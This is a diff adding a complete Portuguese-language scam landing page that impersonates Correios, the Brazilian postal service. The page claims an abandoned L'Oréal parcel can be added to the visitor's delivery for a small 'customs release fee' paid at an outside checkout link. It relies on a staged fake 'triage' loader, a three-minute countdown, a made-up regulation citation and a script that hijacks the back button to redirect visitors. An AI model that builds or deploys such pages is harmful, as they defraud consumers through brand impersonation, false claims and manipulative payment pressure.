@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correios | Triagem Inteligente</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --azul-correios: #00416b;
+            --amarelo-correios: #ffcc00;
+            --verde-sucesso: #28a745;
+            --cinza-fundo: #f4f4f4;
+            --vermelho-alerta: #d32f2f;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Roboto', sans-serif; background-color: var(--cinza-fundo); color: #333; }
+
+        /* --- LOADER SEGURO --- */
+        #loader-triagem {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 9999;
+            text-align: center; padding: 20px;
+        }
+        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid var(--azul-correios); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loader-text { font-size: 15px; color: var(--azul-correios); font-weight: 700; }
+        .loader-subtext { font-size: 12px; color: #666; margin-top: 5px; }
+
+        /* --- HEADER --- */
+        .top-bar { background: #fff; padding: 15px; border-bottom: 4px solid var(--amarelo-correios); text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .logo-img { width: 120px; }
+
+        /* --- CONTEÚDO PRINCIPAL --- */
+        #main-content { display: none; padding-bottom: 30px; }
+        
+        .container { max-width: 600px; margin: 20px auto; padding: 0 15px; }
+
+        .alert-banner { background: var(--vermelho-alerta); color: #fff; padding: 12px; text-align: center; font-size: 13px; font-weight: 700; border-radius: 6px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.85; } 100% { opacity: 1; } }
+
+        .offer-card { background: #fff; border-radius: 8px; border: 2px solid var(--azul-correios); box-shadow: 0 5px 15px rgba(0,0,0,0.1); overflow: hidden; }
+        .card-header { background: var(--azul-correios); color: #fff; padding: 15px; text-align: center; font-weight: 700; font-size: 16px; text-transform: uppercase; }
+        
+        .card-body { padding: 25px 20px; }
+        
+        .main-title { font-size: 20px; color: var(--azul-correios); font-weight: 800; margin-bottom: 15px; text-align: center; line-height: 1.3; }
+        .desc-text { font-size: 14px; color: #444; text-align: justify; line-height: 1.6; margin-bottom: 20px; }
+        
+        .highlight-box { background: #fdfbf0; border: 1px dashed var(--amarelo-correios); padding: 15px; border-radius: 6px; margin-bottom: 20px; }
+        .highlight-box h3 { font-size: 13px; color: #333; margin-bottom: 8px; }
+        .highlight-box ul { list-style: none; font-size: 13px; color: #444; }
+        .highlight-box li { margin-bottom: 6px; padding-left: 20px; position: relative; }
+        .highlight-box li::before { content: "✓"; color: var(--verde-sucesso); position: absolute; left: 0; font-weight: bold; }
+
+        .price-box { background: #f9f9f9; padding: 15px; border-radius: 6px; text-align: center; margin-bottom: 25px; border: 1px solid #eee; }
+        .old-price { text-decoration: line-through; color: #999; font-size: 13px; margin-bottom: 5px; }
+        .new-price { font-size: 34px; font-weight: 800; color: #222; margin-bottom: 5px; }
+        .price-desc { font-size: 12px; color: var(--verde-sucesso); font-weight: 700; text-transform: uppercase; }
+
+        /* --- BOTÕES --- */
+        .btn-aceitar { display: block; background: var(--verde-sucesso); color: #fff; padding: 18px; text-decoration: none; font-weight: 800; border-radius: 6px; text-transform: uppercase; font-size: 15px; text-align: center; box-shadow: 0 4px 0 #1b5e20; transition: 0.2s; border: none; width: 100%; cursor: pointer; }
+        .btn-aceitar:active { transform: translateY(4px); box-shadow: none; }
+        
+        .btn-recusar { display: block; text-align: center; margin-top: 20px; color: #888; font-size: 12px; text-decoration: underline; cursor: pointer; padding: 5px; }
+
+        /* --- TIMER --- */
+        .timer-container { font-size: 14px; font-weight: 700; color: var(--vermelho-alerta); margin-top: 15px; text-align: center; }
+
+        footer { text-align: center; padding: 20px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+
+    <script>
+        (function(window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/backbutton");
+            history.pushState(null, document.title, location.pathname);
+            window.addEventListener("popstate", function() {
+                if (location.hash === "#!/backbutton") {
+                    location.replace("https://ret-conoscagor.online/elseve/up/6/back");
+                }
+            }, false);
+        }(window, location));
+    </script>
+
+    <div id="loader-triagem">
+        <img src="https://miro.medium.com/1*RpaJjaK0hdtXjgR4oDYgTQ.jpeg" style="width: 130px; margin-bottom: 30px;" alt="Correios">
+        <div class="spinner"></div>
+        <div class="loader-text" id="status-text">Calculando rota de entrega...</div>
+        <div class="loader-subtext" id="status-sub">Aguarde um momento.</div>
+    </div>
+
+    <div id="main-content">
+        <header class="top-bar">
+            <img src="https://miro.medium.com/1*RpaJjaK0hdtXjgR4oDYgTQ.jpeg" class="logo-img" alt="Correios">
+        </header>
+
+        <div class="container">
+            <div class="alert-banner">
+                ⚠️ SISTEMA: Lote Adicional Encontrado na sua Rota
+            </div>
+
+            <div class="offer-card">
+                <div class="card-header">
+                    Unificação de Pacotes Liberada
+                </div>
+                <div class="card-body">
+                    <div style="font-size: 45px; text-align: center; margin-bottom: 15px;">📦🔄📦</div>
+                    <h2 class="main-title">Adicione um Kit Premium Maior no mesmo Motoboy!</h2>
+                    
+                    <p class="desc-text">
+                        Durante a triagem da sua entrega flash, nosso sistema identificou um <b>Lote Premium L'Oréal</b> (Edição Completa de Salão) que foi abandonado pelo destinatário original no mesmo centro de distribuição.
+                    </p>
+                    <p class="desc-text">
+                        Como o Motoboy já fará a rota exata até a sua casa, o sistema autorizou que você <b>fique com esta caixa adicional</b> pagando apenas a taxa de liberação alfandegária. <b>Sem custos extras de frete.</b>
+                    </p>
+
+                    <div class="highlight-box">
+                        <h3>O que contém a caixa abandonada:</h3>
+                        <ul>
+                            <li>Kit Completo Elseve Profissional (5 itens)</li>
+                            <li>Sérum de Tratamento Noturno L'Oréal</li>
+                            <li>Bolsa Exclusiva da Campanha 2026</li>
+                        </ul>
+                    </div>
+
+                    <div class="price-box">
+                        <div class="old-price">Valor de Mercado: R$ 459,90</div>
+                        <div class="new-price">R$ 48,76</div>
+                        <div class="price-desc">Apenas Taxa de Liberação</div>
+                    </div>
+
+                    <a href="https://app.penguimpay.com/checkout/c1207f6b-88d3-44ae-bd1d-ab92c57b7732" class="btn-aceitar" id="link-checkout">
+                        UNIFICAR PACOTES E LEVAR TUDO
+                    </a>
+
+                    <div class="timer-container">
+                        ⏱️ A autorização de saque expira em: <span id="countdown">03:00</span>
+                    </div>
+
+                    <a href="https://ret-conoscagor.online/elseve/up/6/back" class="btn-recusar" id="link-recusar">
+                        Não, obrigado. Quero receber apenas o brinde inicial.
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            © 2026 Empresa Brasileira de Correios e Telégrafos.<br>
+            A unificação de pacotes em rotas ativas é regida pela Portaria Normativa nº 11/2026.
+        </footer>
+    </div>
+
+    <script>
+        window.onload = function() {
+            // Lógica do Loader Segura
+            const textStatus = document.getElementById('status-text');
+            const subStatus = document.getElementById('status-sub');
+            
+            setTimeout(() => {
+                textStatus.innerText = "Cruzando dados no Centro de Distribuição...";
+            }, 1500);
+
+            setTimeout(() => {
+                textStatus.innerText = "ALERTA: Pacote Sem Reclamante localizado!";
+                textStatus.style.color = "#d32f2f";
+                subStatus.innerText = "Avaliando compatibilidade com a sua rota...";
+            }, 3000);
+
+            setTimeout(() => {
+                document.getElementById('loader-triagem').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+                startTimer(180); // 3 Minutos
+            }, 5000);
+
+            // Repasse de Parâmetros de URL seguro
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.toString()) {
+                const linkCheckout = document.getElementById('link-checkout');
+                const linkRecusar = document.getElementById('link-recusar');
+                
+                linkCheckout.href += (linkCheckout.href.includes('?') ? '&' : '?') + urlParams.toString();
+                linkRecusar.href += (linkRecusar.href.includes('?') ? '&' : '?') + urlParams.toString();
+            }
+        };
+
+        // Cronômetro funcional e seguro
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            const display = document.getElementById('countdown');
+            
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "00:00";
+                    display.style.color = "#999";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
